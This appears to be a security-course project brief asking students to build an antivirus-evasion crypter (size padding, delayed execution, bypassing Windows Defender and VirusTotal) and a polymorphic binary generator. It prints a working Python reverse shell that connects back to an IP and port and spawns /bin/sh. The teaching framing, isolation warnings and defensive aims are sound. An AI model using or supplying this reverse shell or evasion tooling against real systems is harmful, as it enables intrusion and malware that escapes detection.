## Hidden-Bytes

### Introduction

HiddenBytes challenges you to explore advanced concepts in binary manipulation, obfuscation, and stealth techniques. You will develop two interrelated programs: one that encrypts and modifies binaries while bypassing detection mechanisms and another that generates polymorphic binaries capable of maintaining functionality while dynamically changing their structure.

This project will provide insight into how attackers use advanced techniques to evade detection and ensure persistent execution while adhering to ethical and legal guidelines.

### Why This Project Matters

Understanding offensive techniques is essential for building stronger defenses. As a security professional, you cannot effectively protect systems if you don't understand how attackers operate. This project teaches you to "think like an attacker" so you can:

- **Build Better Defenses**: By understanding evasion techniques, you can design more robust detection systems and security policies.
- **Conduct Effective Security Assessments**: Red team exercises and penetration testing require knowledge of real-world attack methods to identify vulnerabilities before malicious actors do.
- **Improve Incident Response**: When a breach occurs, understanding how malware evades detection helps you analyze threats faster and respond more effectively.
- **Develop Security Tools**: Many antivirus and EDR (Endpoint Detection and Response) solutions are built by professionals who deeply understand the techniques used to bypass them.

The knowledge gained here should be used to **protect organizations, improve security products, and conduct authorized security testing** — never for malicious purposes.

### Objective

The goal of this project is to develop:

1. **An Evasion Program**: Encrypts and modifies binaries, adding stealth techniques like file size manipulation and delayed execution to bypass detection mechanisms.
2. **A Polymorphic Program**: A program that self-modifies but retains its core functionality. This will implement a basic reverse shell payload for practical learning.

By completing this project, you will:

- Understand techniques for binary obfuscation and stealth.
- Explore polymorphic behavior in binary files.
- Learn practical approaches to bypassing antivirus detection.
- Gain hands-on experience with reverse engineering and payload delivery.
- Develop insights into ethical considerations for such techniques.
- Learn how to detect and defend against these techniques in real-world environments.

### Role Play

As part of the project, you will participate in a role-play session where you act as a **Binary Analyst** presenting your work to a team of stakeholders. Prepare to discuss:

- The structure and functionality of the binaries you developed.
- What techniques did you use to implement stealth and polymorphism?
- Recommendations for detecting and mitigating similar techniques.
- Ethical considerations and legal implications of working with obfuscated binaries.
- How organizations can protect themselves against these types of attacks.

### Reverse Shell Payload Explanation

A reverse shell payload is a piece of code that allows a target machine to initiate a connection back to an attacker's machine. This is often used in penetration testing to simulate real-world attack scenarios. In this project, you'll implement a basic reverse shell payload for educational purposes.

Understanding reverse shells is critical for security professionals because:

- **Penetration Testers** use them during authorized assessments to demonstrate the impact of vulnerabilities.
- **Security Engineers** need to recognize reverse shell behavior to build detection rules and firewall policies.
- **Incident Responders** must identify reverse shell connections during breach investigations.

#### Example

A simple reverse shell in Python:

```python
import socket, subprocess, os

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("192.168.1.100", 4444))  # Replace with the attacker's IP and port
os.dup2(s.fileno(), 0)
os.dup2(s.fileno(), 1)
os.dup2(s.fileno(), 2)
subprocess.call(["/bin/sh", "-i"])
```

> **Warning**: Ensure that the reverse shell payload is tested **only** in a controlled, isolated environment, such as your virtual machine. Replace the IP and port in the example with local testing values.

### Project Requirements

#### Setup and Environment

You are required to use a **Windows-based virtual machine** as your development and testing environment. This is mandatory because the project requires testing against Windows Defender and generating Windows executables (`.exe` files). Ensure proper isolation to prevent unintended consequences.

**For Windows/Linux users:**

- Install [VirtualBox](https://www.virtualbox.org/) (free) or [VMware Workstation](https://www.vmware.com/products/workstation-pro.html).
- Download a [Windows 10/11 ISO](https://www.microsoft.com/software-download/windows11) and create a Windows VM.
- Ensure network isolation by using "Host-Only" or "Internal Network" mode.

**For Apple Silicon (M1/M2/M3/M4) users:**

- Install [UTM](https://mac.getutm.app/) (free) or [Parallels Desktop](https://www.parallels.com/) (paid).
- Download [Windows 11 ARM](https://www.microsoft.com/en-us/software-download/windowsinsiderpreviewarm64) from Microsoft's Insider Preview program.
- Create a **Windows 11 ARM** VM using UTM or Parallels.
- Ensure network isolation by configuring network settings appropriately.

> **Note:** VirtualBox does not support Apple Silicon. Apple Silicon users **must** use UTM or Parallels with Windows 11 ARM. A standard Windows x86/x64 ISO will not work on Apple Silicon.

#### The Challenge

1. **Evasion Program:**
   - Encrypt a target binary and add stealth features:
     - File size manipulation: Increase the binary size (e.g., 101 MB).
     - Execution delay: Ensure the binary does not execute until a specified delay (e.g., 101 seconds).
   - Ensure the encrypted binary bypasses detection by Windows Defender and at least 60% of security vendors on VirusTotal.

2. **Polymorphic Program:**
   - Generate binaries that self-modify while maintaining their original functionality.
   - Use a reverse shell as the payload for the polymorphic binary.

#### Usage Examples

**Evasion Program:**

```sh
$> evasion --help
Evasion Program Usage:
  --encrypt <target-binary>        Encrypt the target binary.
  --output <output-binary>         Specify the name of the encrypted binary file.
  --add-size <size-in-mb>          Increase the binary size (e.g., 101 MB).
  --delay <seconds>                Specify execution delay in seconds (default: 101).
$> evasion --encrypt target.exe --output obfuscated.exe --add-size 101 --delay 101
Encryption is successful! Encrypted binary saved as "obfuscated.exe".
$> obfuscated.exe
[INFO] Execution delayed by 101 seconds...
[INFO] Binary decrypted successfully.
[INFO] Target program executed.
```

**Polymorphic Program:**

```sh
$> polymorph --help
Polymorphic Program Usage:
  --generate <output-binary>       Generate a polymorphic binary.
  --payload <reverse-shell-code>   Embed the reverse shell payload.
$> polymorph --generate polymorphic.exe --payload reverse_shell_payload
Polymorphic binary generated successfully as "polymorphic.exe".
$> polymorphic.exe
[INFO] Polymorphic signature updated successfully.
[INFO] Reverse shell initialized. Attempting connection to attacker...
```

### Documentation

Create a `README.md` file that includes:

- **Evasion Program Explanation**: Detail how the program encrypts and modifies binaries.
- **Polymorphic Program Explanation**: Explain how the program generates self-modifying binaries.
- **Walkthroughs**: Provide step-by-step instructions for using both programs.
- **Technical Insights**: Include binary structure analysis, encryption methods, and stealth techniques.
- **Defensive Recommendations**: Explain how organizations can detect and defend against these techniques.
- **Ethical and Legal Report**: Discuss ethical responsibilities and legal considerations when working with these techniques.

### Bonus

If you complete the mandatory part successfully, challenge yourself by adding additional features, such as:

- **Advanced Obfuscation Techniques**: Add features like API hooking, anti-debugging checks, or stealth memory allocation for obfuscating payloads further.
- **Custom Encryption Algorithms**: Develop your own encryption algorithm for better security.
- **GUI Implementation**: Create a graphical interface for ease of use.
- **Detection Tool**: Build a companion tool that detects the evasion techniques you implemented.

Challenge yourself!

### Ethical and Legal Considerations

This project is for educational purposes only. The skills you learn here are the same skills used by:

- **Red Team Professionals** who help organizations identify weaknesses.
- **Malware Analysts** who reverse-engineer threats to protect users.
- **Security Researchers** who discover vulnerabilities and develop patches.
- **Antivirus Developers** who build detection signatures and heuristics.

You are responsible for ensuring all testing is conducted within a secure, isolated environment. Do not use or share the tools developed in this project outside of its intended purpose. Misuse of these techniques is strictly prohibited and may violate local laws.

> **Disclaimer**: This project is for educational purposes only. Unauthorized use of these techniques is prohibited and may be illegal.

> **Disclaimer**: Unauthorized use of reverse shells or obfuscated binaries outside of this controlled project environment is strictly prohibited. Misuse may result in legal consequences.

### Submission and Audit

Submit the following:

- Source code for both the evasion and polymorphic programs.
- `README.md` file with detailed documentation.

Ensure that your virtualization software (VirtualBox, VMware, UTM, or Parallels) is installed and your **Windows VM** is ready for the audit demonstration.

### Resources

Some useful resources:

- [Bypassing Antivirus Dynamics](https://wikileaks.org/ciav7p1/cms/files/BypassAVDynamics.pdf): Insights into bypassing antivirus systems.
- [Cryptology Resources](https://cryptohack.org/): Explore cryptographic techniques.
- [Executable File Formats](https://en.wikipedia.org/wiki/Executable_and_Linkable_Format): Learn about ELF, PE, and other formats.
- [Netcat for Reverse Shells](https://en.wikipedia.org/wiki/Netcat): Understand reverse shells and their applications.
- [VirtualBox Downloads](https://www.virtualbox.org/): Virtualization for Windows/Linux users.
- [UTM for macOS](https://mac.getutm.app/): Free virtualization for Apple Silicon users.
- [Windows 11 ARM Download](https://www.microsoft.com/en-us/software-download/windowsinsiderpreviewarm64): Windows for Apple Silicon users.
- [MITRE ATT&CK Framework](https://attack.mitre.org/): Understanding adversary tactics and techniques for better defense.
